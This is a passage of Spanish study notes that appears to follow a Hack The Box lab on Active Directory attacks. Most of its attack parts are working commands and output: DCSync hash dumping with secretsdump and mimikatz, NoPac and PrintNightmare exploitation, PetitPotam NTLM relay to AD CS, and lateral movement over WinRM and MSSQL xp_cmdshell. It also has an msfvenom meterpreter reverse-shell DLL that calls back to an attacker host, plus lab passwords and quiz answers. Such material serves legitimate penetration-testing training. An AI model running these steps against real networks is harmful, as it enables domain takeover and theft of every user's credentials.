  - Activar la Política avanzada de auditoría de seguridad.
  - Revisar el Evento 5136 (modificación de objetos en AD) como indicador de ataque.
  - El detalle de cambios se muestra en formato SDDL; usar ConvertFrom-SddlString en PowerShell para interpretarlo de forma legible.


## Sincronización DCSync

DCSync es un ataque que abusa del protocolo de replicación de Active Directory, haciéndose pasar por un controlador de dominio para pedirle los hashes NTLM de cualquier usuario. Para lograrlo, el atacante necesita una cuenta con permisos de replicación (Replicar cambios de directorio y Replicar cambios de directorio, todos). Normalmente esos permisos los tienen los administradores de dominio, pero si se conceden a cuentas estándar y se comprometen, también pueden usarse para extraer los hashes de todo el dominio.

> Cuando un dominio de Active Directory tiene varios controladores de dominio, ellos sincronizan entre sí objetos del directorio usando el protocolo Directory Replication Service Remote Protocol (DRS-R)

Permisos de replicación necesarios (Los Admin de Dominio los suelen tener por defecto)
- Replicar cambios de directorio
- Replicar cambios de directorio

**Viewing adunn's Replication Privileges through ADSI Edit**
Es normal encontrar usuarios comunes con estos derechos, por lo que con uno de estos podriamos obtener todos los Hashes NTLM de incluso sus contraseñas anteriores. Como se observa en la imagen con adunn
<img width="1056" height="528" alt="image" src="https://github.com/user-attachments/assets/54933b6c-01b5-4b5b-900b-7c33a577ceaa" />

**Using Get-DomainUser to View adunn's Group Membership**

```
#Validación de membresias del grupo en el que esta adunn (Get-DomainUser)
Import-Module .\PowerView.ps1
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

#Verificacion de derechos de Replicación (Get-ObjectAcl)
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"  #Se crea un objeto con el SID referente a adunn
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
  ObjectAceType: DS-Replication-Get-Changes
```
> Si tuvieramos permisos de "WriteDacl" podriamos agregar estos permisos a un usuario bajo nuestro control

Este ataque se puede realizar con herramientas como **Mimikatz**, **Invoke-DCSync** y **Impacket-secretsdump**

**Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py**
```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
  -just-dc -Indica a la herramienta que extraiga los hashes NTLM y las claves de Kerberos del archivo NTDS (Crea 3 archivos 1. hashes NTLM 2. Claves de Kerberos 3. Contraseñas sin cifrar del NTDS)
  -just-dc-ntlm -Indica que unicamente queremos extraer los hashes NTLM
  -just-dc-user <USERNAME> -Extraer los datos de un unico usuario
  -pwd-last-set -Ver fecha de ultimo cambio de contraseña
  -history -Para volcar/obtener todo el historial de contraseñas
  -user-status -Comprobar si un usuario esta deshabilitado

cat inlanefreight_hashes.ntds.cleartext
  ```
> El archivo NTDS.dit (NT Directory Services) es la base de datos principal del Active Directory en sistemas Windows Server

Es util para el cliente saber _Número y porcentaje de contraseñas descifradas_, _Las 10 mejores contraseñas_, _Métricas de longitud de contraseña_, _Reutilización de contraseña_. De cuentas activas del dominio

**Listing Hashes, Kerberos Keys, and Cleartext Passwords**

Estas cuentas NTDS (Contraseñas con cifrado reversible) son poco comunes, y se utilizan para aplicacion que utilizan protocolos especificos y necesitan credenciales de autenticación
<img width="1206" height="605" alt="image" src="https://github.com/user-attachments/assets/d23f5bca-093d-4242-9029-f0a25c2566b6" />
Estas cuentas estan cifradas con RC4 pero su clave de descifrado esta en el _Syskey_ y puede ser extraida por un Admistrador de Dominio o usando DCSync.
> Si un usuario desactiva esta opcion (de contraseña reversible), la contraseña seguirá almacenada de forma reversible hasta que el usuario la cambie.


```
#Busqueda de usuarios con Contraseña Reversible usando PowerView
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
  -band 128  -El valor 128 indica que el almacenamiento reversible está habilitado

#Busqueda alternativa
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

**Using runas.exe**
Para realizar el mismo ataque de extraccion de contraseñas usando runas.exe
```
runas /netonly /user:INLANEFREIGHT\adunn powershell
  Enter the password for INLANEFREIGHT\adunn:
```

**Performing the Attack with Mimikatz - Windows** (Debe tener permisos **DCSync**)
Para el ataque con _Mimikatz_ debemos dirigirnos a un usuario especifico como a un Administrador o podria ser al **krbtgt** (Kerberos Ticket Granting Ticket) y usar esto para obtener persistencia con un Golden Ticket

```
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator  #O krbtgt para Golden Ticket
```
**Solución Preguntas**
```
#Conexion Inicial - Desde mi maquina
xfreerdp3 /u:htb-student /p:'Academy_student_AD!' /v:10.129.8.59:3389  #Conetarme a la maquina Windows
ssh htb-student@10.129.185.222 --> Password: HTB_@cademy_stdnt!  #Conectarme a la maquina Linux

#En Windows - Se enumera y verifican los derechos y permisos de Replicacion

#En Linux - Se dumpean las credenciales con Impacket-Secretsdump
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 --> Password: SyncMaster757

#Obtener la contraseña en texto claro del usuario syncron
secretsdump.py -outputfile inlanefreight_hashes -just-dc -just-dc-user syncron INLANEFREIGHT/adunn@172.16.5.5

#Piden el hash NTLM del usuario khartsfield 
secretsdump.py -outputfile inlanefreight_hashes -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5  #Extraigo unicamente los hashes NTLM
cat inlanefreight_hashes* | grep "khartsfield"

inlanefreight.local\khartsfield:1138:aad3b435b51404eeaad3b435b51404ee:4bb3b317845f0954200a6b0acc9b9f9a:::
<dominio>\<usuario>:<RID>:<LM hash>:<NT hash>:::  #Estructura del resultado
4bb3b317845f0954200a6b0acc9b9f9a  #Respuesta
```

______________________________________________________________________


## Privileged Access
Si se tiene una cuenta con derechos de administrador local, se pueden usar técnicas como Pass-the-Hash vía SMB.
En caso de no contar con admin local, existen otros métodos de movimiento lateral:

- RDP: acceso remoto con GUI.
- PowerShell Remoting (WinRM): ejecutar comandos o sesiones remotas con PowerShell.
- MSSQL Server: con privilegios de sysadmin se pueden ejecutar consultas y comandos del sistema bajo el contexto del servicio SQL.

**Remote Desktop**

En el caso de RDP, si un usuario pertenece al grupo Remote Desktop Users en un host, puede iniciar sesión aunque no tenga privilegios de administrador. Esto resulta útil para:

- Lanzar ataques adicionales.
- Escalar privilegios y robar credenciales.
- Extraer datos o información sensible.

```
#Con PowerView, se puede enumerar los miembros del grupo Remote Desktop Users (con Get-NetLocalGroupMember)
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
  MemberName: INLANEFREIGHT\Domain Users  #Indica que todos los usuarios del dominio pueden ejecutar RDP
```
> Lo primero que se debe preguntar al exportar los datos a BloodHound es: **¿El grupo Usuarios de dominio tiene derechos de administración local o derechos de ejecución (como RDP o WinRM) sobre uno o más hosts?**

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound**

<img width="1334" height="630" alt="image" src="https://github.com/user-attachments/assets/f81a5e5a-631f-42b0-b9cf-c0b9dfaa3f74" />
Si capturamos las credenciales de un usuario ya sea con LLMNR/NBT-NS Response Spoofing o Kerberoasting vale la pena revisar si iene permisos de RDP
<img width="729" height="462" alt="image" src="https://github.com/user-attachments/assets/9de5658a-946b-4161-a7e2-642c0f16e2e2" />
O a traves de las consultas en la pestaña de **Analysis**

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT

Find Workstations where Domain Users can RDP
Find Servers where Domain Users can RDP
```
<img width="1025" height="731" alt="image" src="https://github.com/user-attachments/assets/14e2468c-7549-4d53-a321-222f4dcfb7fd" />

**Herramientas:** xfreerdp3 o Remina - En Windows mstsc.exe

### WinRM
Igual que con RDP un usuario o un grupo de usuarios podria tener estos permisos habilitados **CanPSRemote**

```
#Enumerar usuarios con permisos de WinRemoteManagement (con Get-NetLocalGroupMember) en PowerView
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
  MemberName: INLANEFREIGHT\forend
```
Con _BloodHound_ se puede averigurar usando el Raw Query
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Connecting to a Target with Evil-WinRM and Valid Credentials**
**Windows**
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
**Linux** Evil-WinRM
```
#Instalar evil-winrm
gem install evil-winrm

#Conexion
evil-winrm -i 10.129.201.234 -u forend -p password
```
En sesiones remotas con evil-winrm:

- Crear un objeto PSCredential y reenviar credenciales en cada petición.
- Ejemplo:
```
$SecPassword = ConvertTo-SecureString 'Password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DC.local\User', $SecPassword)
get-domainuser -spn -credential $Cred
```
Con _-credential_, funciona la consulta al DC; sin él, falla.


### SQL Server Admin
Es comun encontrar usuarios y cuentas de servicio con privilegios _sysadmin_ en las instancias de SQL Server. Podemos obtener estas credenciales como con: Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Otra fora es usar **Snaffler** para encontrar web.config o archivos con credenciales de conexion a la base de datos.
> El acceso como sysadmin a SQL permite ejecutar comandos dentro del servidor
```
#Enumerar usuarios con derechos de Administrador SQL con Raw Query (BloodHound)
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
**Enumerating MSSQL Instances with PowerUpSQL**
En este caso podemos usar el los permisos para cambiar contraseñas del usuario wley para cambiar contraseña del usuario damundsen (el cual tiene permisos de sysadmin en SQL) y usando [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) autenticarnos

```
#Enumerar instancias SQL con PowerUpSQL
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
  DomainAccount    : damundsen

#Demostrar acceso con ejecucion de comandos (Windows)
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

#Conexion a la base de datos con credenciales (Linux)
impacket-mssqlclient
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
  ! {cmd}  - executes a local shell cmd

enable_xp_cmdshell
xp_cmdshell <command>
```

Ya con la posibilidad de ejecucion de comandos se enumera los privilegios, en busca de **SeImpersonatePrivilege** para escalar a SYSTEM con herramientas como: JuicyPotato, PrintSpoofer, or RoguePotato [Escalada de Privilegios HTB](https://academy.hackthebox.com/course/preview/windows-privilege-escalation)

**Enumerating our Rights on the System using xp_cmdshell**

```
#Enumerar derechos/privilegios del usuario con xp_cmdshell (Dentro del SQL Server)
xp_cmdshell whoami /priv
  SeImpersonatePrivilege  | Impersonate a client after authentication  |  Enabled
```

## Kerberos Double Hop Problem

Cuando se usa Kerberos en conexiones de dos o más saltos (ej. WinRM/PowerShell), el ticket solo permite acceder al recurso inicial. A diferencia de NTLM, no se almacena el hash en memoria, por lo que no se puede reutilizar para acceder a otros recursos.

En consecuencia, aunque la cuenta tenga permisos, se deniega el acceso en movimientos laterales o a recursos como file shares.

Con autenticación basada en contraseña (ej. PSExec vía SMB o LDAP), el NTLM hash sí queda en memoria y puede usarse en conexiones posteriores.

> En sesiones establecidas con SMB o LDAP (ej. PSExec), el hash NTLM queda en memoria (en la sesion) y sí puede reutilizarse.
> Con WinRM, la contraseña nunca se almacena en la sesión → si revisamos con Mimikatz, las credenciales aparecen en blanco.

**Demostración**
Desde una sesion de WinRM autenticado, iniciamos Mimikatz y comprobamos las credenciales del "backupadm" (Como se menciono anteriormente estan en blanco)
 ```
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
cd 'C:\Users\Public\'
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

mimikatz(commandline) # privilege::debug
mimikatz(commandline) # sekurlsa::logonpasswords
  * Username : (null)
  * Password : (null)

#Pero si existen procesos que se ejecutan en el contexto de "backupadm"
tasklist /V |findstr backupadm
```
**Ejemplo**
- Escenario: Attack Host → DEV01 → DC01.
- Te conectas a DEV01 con credenciales de dominio (ej. evil-winrm).
- En esa sesión, no se almacena el TGT (Ticket Granting Ticket) del usuario, solo el TGS (Ticket Granting Service) para acceder a DEV01.
- Cuando intentas acceder a DC01 (ej. con PowerView para consultar AD), no hay TGT que permita obtener nuevos tickets (ya que no se almaceno en un principio), por lo que el acceso es denegado.

Clave:

- El TGS permite ejecutar comandos en DEV01, pero sin TGT no puedes saltar al siguiente host.
- Con delegación sin restricciones: el TGT sí se envía al servidor inicial, queda en memoria y puede reutilizarse para pedir TGS hacia otros hosts → se elimina el problema del doble salto.

### Soluciones al problema del Doble Salto
[Soluciones al Problema del Doble Salto](https://posts.slayerlabs.com/double-hop/)
  
#### Solucion 1. PSCredential Object (EvilWinRM)
Cuando te conectas por WinRM (evil-winrm) al host remoto solo tienes en caché el TGS para ese servidor, no el TGT, por eso comandos que necesitan hablar con el DC (p. ej. get-domainuser -spn) fallan y klist muestra solo un ticket. En esa sesión los secretos no están en memoria y no se pueden delegar a un segundo salto (doble salto).
La solución rápida es pasar credenciales explícitas al comando creando un PSCredential y usándolo con el cmdlet.

```
#Importando PowerView en EvilWinRM
import-module .\PowerView.ps1

#Al intentar ejecutar un comando en otro servidor con el usuario actual que si tiene permisos, aparece un error ya que el TGT no es enviado
get-domainuser -spn  #Genera error

#Verificando los tickets almacenados, solo se ve 1 (es el TGS)
klist

SOLUCION
#Se crean objetos seguros, con las credenciales del usuario (conectado por WinRM)
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

#Se procesa bien el comando ya que contiene las credenciales validas (Las cuales se almacenan en memoria (Se comprueba con "klist"))
get-domainuser -spn -credential $Cred | select samaccountname
```

#### Solucion 2. Register PSSession Configuration (Con acceso a GUI)
Si tenemos un host unido al dominio y podemos conectarnos a otro host a traves de WinRM o usando el "Enter-PSSession cmdlet". Sin crear un PSCredential ya que no funciona pára todas las aplicaciones.
La solucion es 
```
#Creando sesion en el host remoto
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

klist  #Mismo problema

SOLUCION
#Registrar una nueva configuracion de sesion (Register-PSSessionConfiguration)
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

#Reiniciamos el servicio WinRM en nuestra PSSession actual
Restart-Service WinRM
```

Si el usuario inicia sesión en un host Windows con RDP, el TGT queda cacheado, permitiendo acceso directo a recursos del dominio sin sufrir el Double Hop.

> **WinRM** se comunica a traves de HTTP y procesa las solicitudes con SOAP (Protocolo simple de acceso a objetos) en formato XML para comunicarse a traves de HTTP

Después de iniciar la sesión nuevamente, podemos ver que el problema del doble salto ha sido eliminado, y si escribimos klist, tendremos los tickets almacenados en caché necesarios para llegar al controlador de dominio. Esto funciona porque nuestra máquina local ahora se hará pasar por la máquina remota en el contexto del usuario "backupadm" y todas las solicitudes de nuestra máquina local se enviarán directamente al controlador de dominio.

```
#Creando nuevamente la sesion en el host remoto
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadm

#Prueba de ejecucion de comandos
get-domainuser -spn | select samaccountname
```

**Resumen**
```
1) Registrar la sesión que ejecutará comandos como backupadm (requiere PowerShell elevado)
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential INLANEFREIGHT\backupadm

2) Reiniciar WinRM (puede desconectar sesiones)
Restart-Service WinRM

3) Conectarse usando la sesión registrada (ya no necesitas pasar -Credential en cada cmdlet)
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess

4) Verificar tickets: ahora klist debe mostrar el TGT (krbtgt) y PowerView funciona sin -Credential
klist
get-domainuser -spn | select samaccountname
```

**Limitaciones**

- Register-PSSessionConfiguration requiere privilegios elevados y muestra un prompt de credenciales: no funciona desde evil-winrm ni desde shells PowerShell en Linux (Solo GUI - Si funciona desde una maquiba de ataque Windows). 
- Funciona bien desde un host Windows (o vía RDP) donde puedas ejecutar cmdlets elevados; útil para usar el host como "jump host" sin doble salto.
- Otras alternativas (si no puedes usar esto): CredSSP, reenvío de puertos o inyección en un proceso en contexto del usuario (cada una con sus propias restricciones).

> También podemos utilizar otros métodos como CredSSP, reenvío de puertos o inyección en un proceso que se ejecuta en el contexto de un usuario objetivo (proceso de sacrificio) que no cubriremos aquí.


## Bleeding Edge Vulnerabilities (Vulnerabilidades de Vanguardia (2022))


### NoPac (SamAccountName Spoofing/Suplantación) tambein llamado Sam_The_Admin vulnerability
> Esta vulnerbilidad barca estos dos CVEs ` CVE 2021-42278 y 2021-42287`
> [noPac Flujo de Ataque](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)

Repositorio [noPac](https://github.com/Ridter/noPac)
- Vulnerabilidad: combinación de CVE-2021-42278 (bypass en SAM) y CVE-2021-42287 (fallo en Kerberos PAC).
- Impacto: permite que un usuario estándar del dominio escale a Domain Admin con un solo comando.
- Base del ataque: cambiar el SamAccountName de un equipo a que coincida con un DC, y forzar a Kerberos a emitir tickets con ese nombre → acceso como DC / SYSTEM.

**Preparación** Se verifica que se tenga instalado Impacket y noPac
```
# Instalar Impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && python setup.py install

# Clonar NoPac
git clone https://github.com/Ridter/noPac.git
cd noPac
```

#### Verificar Vulnerabilidad (Scanner)
```
#Se ejecuta la herramienta de escaneo para comprobar la vulnerbailidad
sudo python3 scanner.py dominio.local/User:Password -dc-ip DC_IP -use-ldap
    [*] Current ms-DS-MachineAccountQuota = 10  #Verificacion de permisos para crear/modificar usuarios SAM
    [*] Got TGT with PAC from 172.16.5.5. Ticket size 1484  #Comprobación de obtencion del Ticket Granting Ticket
```

#### Explotacion
```
sudo python3 noPac.py dominio.local/User:Password -dc-ip DC_IP -dc-host DC_HOST -shell --impersonate administrator -use-ldap

- Añade máquina falsa.
- Spoofea el SamAccountName → DC.
- Obtiene TGT como el DC.
- Impersona al administrador.
- Abre semi-interactive shell (smbexec).
    Nota: usar rutas completas (C:\Windows\system32\cmd.exe) en lugar de cd.

#los tickets creados se guardan en unarchivo con extension ".ccache" el cual puede servir para Pass-the-Ticket
```

#### Explotación: DCSync directo con NoPac

```
sudo python3 noPac.py dominio.local/User:Password -dc-ip DC_IP -dc-host DC_HOST --impersonate administrator -use-ldap -dump -just-dc-user dominio/administrator

- Realiza DCSync vía secretsdump.py.
- Devuelve NTLM hashes y claves Kerberos del administrador.
- Con esto → acceso total al dominio.
```
### Windows Defender & SMBEXEC.py Considerations
smbexec.py establece una conexión SMB y crea dos servicios temporales llamados BTOBTO y BTOBO. Cuando escribes un comando, el script genera un archivo por lotes (execute.bat) que contiene ese comando. Este archivo se copia al sistema víctima, se ejecuta mediante el servicio creado, y luego se elimina. Esto es detectado facilmente por AV o EDR

### PrintNightmare
> PrintNightmare es el nombre dado a dos vulnerabilidades del servicio Print Spooler en Windows. Estas vulnerabilidades permiten ejecución remota de código (RCE) y escalada de privilegios. Son muy útiles para comprometer máquinas dentro de un dominio, especialmente Domain Controllers.

```bash
Lo ideal aca es ejecutar todos los comando en el mismo directorio, y tener todos los archivos en el mismo directorio

#Clonar exploit
git clone https://github.com/cube0x0/CVE-2021-1675.git

#Instalar version modificada de impacket (Necesaria para que funcione)
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

#Comprobar si el objetivo es vulnerable
rpcdump.py @<IP_OBJETIVO> | egrep 'MS-RPRN|MS-PAR'
  Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
  Protocol: [MS-RPRN]: Print System Remote Protocol 

#Crear payload con MSF Venom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATACANTE(A la cual la victima alcanza)> LPORT=<PUERTO> -f dll > backupscript.dll

#Compartir payload con smbserver.py (Idealmente en el mismo directorio ". o /home/kali/Desktop")
sudo smbserver.py -smb2support CompData .
smbclient '\\localhost\CompData' -N    #Comprobar el acceso al archivo

#Configurar Multi/Handler de MSF
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_ATACANTE>
set LPORT <PUERTO>
run

#Ejecutar exploit
sudo python3 CVE-2021-1675.py dominio/usuario:contraseña@IP_víctima '\\IP_atacante\CompData\backupscript.dll'
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

### PetitPotam (MS-EFSRPC)

- Vulnerabilidad LSA Spoofing → permite forzar a un Domain Controller (DC) a autenticarse contra un host controlado por el atacante.
- Se abusa de MS-EFSRPC (Encrypting File System Remote Protocol).
- Si hay AD CS (Active Directory Certificate Services) con Web Enrollment habilitado, el atacante puede:
  - Forzar al DC a autenticarse.
  - Relayar la autenticación hacia la CA.
  - Solicitar un certificado para el DC.
  - Usar ese certificado para pedir un TGT y finalmente hacer DCSync (compromiso total del dominio).

```
#Iniciamos la captura de NTLM en la web con el CA (se puede usar "certi" para hallarla)
sudo ntlmrelayx.py -debug -smb2support --target http://CA.DC.local/certsrv/certfnsh.asp --adcs --template DomainController
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

#Forzar al DC a autenticarse en nuestro host (donde se ejecuta el ntlmrelay.py) con PetitPotam
python3 PetitPotam.py <IP_ATTACKER> <IP_DC>
python3 PetitPotam.py 172.16.5.225 172.16.5.5

-------------------------------------------------
#Alternativas de Explotación - Windows
Mimikatz
  misc::efs /server:<DC> /connect:<ATTACKER>
PowerView
  Invoke-PetitPotam.ps1
-------------------------------------------------

#Se captura el certificado del DC con ntlmrelay.oy
[*] Authenticating against ... SUCCEED
[*] Generating CSR...
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user DC01$:
-----BEGIN CERTIFICATE-----
MIIStQIBAzCCEn8GCSqGSIb3DQEHA...
-----END CERTIFICATE-----

# Convertir el certificado capturado en TGT (Ticket Granting Ticket)
python3 gettgtpkinit.py DC.local/DC01$ -cert-pfx DC01.pfx -pfx-pass <password> DC01.ccache
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
    #Usando Windows
Rubeus.exe asktgt /user:DC01$ /certificate:DC01.pfx /getcredentials /ptt
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
    klist   #Confirmar si los tickets TGT estan guardados


#DCSync (robar hashes NTLM de todos los usuarios del dominio)
secretsdump.py -k -no-pass DC.local/User@DC
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

#Verificar acceso con el hash NTLM 
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

#Obtener el NT hash (Solicitando el TGS a nosotros mismos) (Luego usar el hash obtenido con secretsdump.py -hashes)
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

#Uso del controlador de dominio pra ataque DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

#Solicitar TGT y ejecutar Pass The Ticket y hacer un DCSync debuido a que los DC tienen permisos de replicacion 
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

#Mimikatz para ataque DCSync
cd .\mimikatz\x64\
.\mimikatz.exe
  lsadump::dcsync /domain:DC.local /user:Administrator
  lsadump::dcsync /user:inlanefreight\krbtgt
```
> Cada uno de estos ataques se puede realizar con acceso de usuario de dominio estándar (NoPac y PrintNightmare) o sin ningún tipo de autenticación al dominio (PetitPotam), y puede provocar que el dominio se comprometa con relativa facilidad.

**Recomendaciones para el cliente**
- Para evitar ataques de retransmisión NTLM, utilice Protección extendida para autenticación junto con habilitar Requiere SSL permitir únicamente conexiones HTTPS para los servicios de inscripción web de la autoridad certificadora y del servicio web de inscripción de certificados
- Deshabilitar la autenticación NTLM para controladores de dominio
- Deshabilitar NTLM en servidores AD CS mediante Política de grupo
- Deshabilitar NTLM para IIS en servidores AD CS donde se utilizan los servicios de inscripción web de la autoridad certificadora y del servicio web de inscripción de certificados


## Miscellaneous Misconfigurations

**Exchange Related Group Membership** (Mebresia de rupos relacionados con el intercambio)
> Provocada por una instalacion de **Micrososft Exchange** dentro de un AD, ya que a menudo se le otorgan privilegios considerables (Permisos de escribir un DACL)

**Exchange Windows Permissions**
El grupo Exchange Windows Permissions no está listado como protegido pero los miembros obtienen la capacidad de escribir un DACL al objeto del dominio, lo que puede aprovecharse para dar privilegios DCSync a un usuario. Un atacante puede agregar cuentas a este grupo aprovechando una mala configuración de DACL o mediante una cuenta comprometida que sea miembro del grupo Account Operators.

**PrivExchange**
El ataque PrivExchange resulta de una falla en la función PushSubscription del Exchange Server, que permite a cualquier usuario del dominio con un buzón forzar al servidor Exchange a autenticarse contra cualquier host proporcionado por el cliente a través de HTTP. El servicio Exchange se ejecuta como SYSTEM y tiene privilegios excesivos por defecto (WriteDacl en el dominio pre-2019 Cumulative Update). Esta falla puede aprovecharse para relay a LDAP y volcar la base de datos NTDS del dominio.

**Printer Bug**
El Printer Bug es una falla en el protocolo MS-RPRN que permite a cualquier usuario del dominio conectarse al named pipe del spooler con el método RpcOpenPrinter y usar RpcRemoteFindFirstPrinterChangeNotificationEx para forzar al servidor a autenticarse contra cualquier host proporcionado por el cliente a través de SMB. El servicio spooler se ejecuta como SYSTEM y está instalado por defecto en servidores Windows con Desktop Experience.

```
# Enumeración del MS-PRN Printer Bug
Import-Module .\SecurityAssessment.ps1

Get-SpoolStatus -ComputerName <TARGET_DC>
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
**MS14-068**
Esta fue una falla en el protocolo Kerberos que podía aprovecharse junto con credenciales de usuario estándar del dominio para elevar privilegios a Domain Admin. La vulnerabilidad permitía que un PAC falsificado fuera aceptado por el KDC como legítimo. Puede explotarse con herramientas como Python Kerberos Exploitation Kit (PyKEK) o el kit de herramientas Impacket.

**Sniffing LDAP Credentials**
Muchas aplicaciones e impresoras almacenan credenciales LDAP en su consola de administración web para conectarse al dominio. Estas consolas a menudo se dejan con contraseñas débiles o predeterminadas. A veces, estas credenciales pueden verse en texto claro, o la aplicación tiene una función de conexión de prueba que podemos usar para recopilar credenciales cambiando la dirección IP LDAP a la de nuestro host de ataque.

**Enumerating DNS Records**
Podemos usar la herramienta adidnsdump para enumerar todos los registros DNS en un dominio usando una cuenta de usuario válida del dominio. Esto funciona porque, por defecto, todos los usuarios pueden listar los objetos hijos de una zona DNS en un entorno AD.
```
# Enumeración básica de registros DNS
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC_IP>
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5

# Resolver registros desconocidos con la opción -r
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC_IP> -r

# Verificar contenido del archivo generado
head records.csv
```


### Other Misconfigurations

**Password in Description Field**
La información sensible como contraseñas de cuenta a veces se encuentra en los campos Description o Notes de la cuenta de usuario y puede enumerarse rápidamente usando PowerView.
```
# Buscar contraseñas en el campo Description
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

**PASSWD_NOTREQD Field**
Es posible encontrar cuentas de dominio con el campo passwd_notreqd establecido en el atributo userAccountControl. Si esto está configurado, el usuario no está sujeto a la política de longitud de contraseña actual.
```
# Verificar configuración PASSWD_NOTREQD
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

**Credentials in SMB Shares and SYSVOL Scripts**
El share SYSVOL puede ser un tesoro de datos, especialmente en organizaciones grandes. Podemos encontrar muchos scripts batch, VBScript y PowerShell diferentes dentro del directorio scripts, que es legible por todos los usuarios autenticados en el dominio.
```
# Listar scripts en SYSVOL
ls \\<DC_NAME>\SYSVOL\<DOMAIN>\scripts
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

# Examinar contenido de script
cat \\<DC_NAME>\SYSVOL\<DOMAIN>\scripts\<SCRIPT_NAME>
```

**Group Policy Preferences (GPP) Passwords**
Cuando se crea un nuevo GPP, se crea un archivo .xml en el share SYSVOL. Estos archivos pueden contener el atributo cpassword que está encriptado con AES-256 bit, pero Microsoft publicó la clave privada AES en MSDN.

```
# Desencriptar contraseña GPP manualmente
gpp-decrypt <CPASSWORD_VALUE>

